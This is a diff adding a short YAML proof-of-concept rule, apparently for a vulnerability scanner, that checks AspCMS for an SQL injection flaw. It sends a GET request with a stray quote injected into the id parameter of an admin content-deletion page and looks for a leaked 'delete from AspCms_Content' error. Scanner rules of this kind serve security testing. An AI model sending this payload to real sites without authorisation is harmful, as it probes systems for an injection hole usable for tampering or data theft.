@@ -1,0 +1,7 @@
+name: poc-yaml-aspcms-blind-sqli
+rules:
+  - method: GET
+    path: /admin_aspcms/_content/_Content/AspCms_ContentFun.asp?action=tdel&id=2='
+    follow_redirects: false
+    expression: |
+      status == 200 && body.bcontains(b'sql=delete from AspCms_Content')
